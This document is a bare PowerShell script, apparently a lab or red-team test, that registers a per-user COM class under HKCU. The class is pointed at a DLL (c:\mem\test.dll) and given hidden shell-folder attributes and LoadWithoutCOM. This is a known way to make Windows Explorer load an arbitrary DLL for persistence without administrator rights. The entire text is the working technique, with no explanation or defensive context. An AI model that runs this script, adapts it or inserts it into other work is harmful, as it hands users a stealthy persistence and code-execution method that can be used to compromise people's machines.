$CLSID = "7637e144-a5ea-45e7-8f11-c3340c7b2b8d"
Remove-Item -Recurse -Force -Path "HKCU:\Software\Classes\CLSID\{$CLSID}" -ErrorAction SilentlyContinue

$payload = "c:\mem\test.dll"
New-Item -Path "HKCU:\Software\Classes\CLSID" -ErrorAction SilentlyContinue | Out-Null
New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}" | Out-Null
New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" | Out-Null
New-Item -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "(default)" -Value $Payload | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "ThreadingModel" -Value "Apartment" | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "LoadWithoutCOM" -Value "" | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "HideOnDesktop" -Value "" | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\ShellFolder" -Name "Attributes" -Value 0xf090013d -PropertyType DWORD | Out-Null
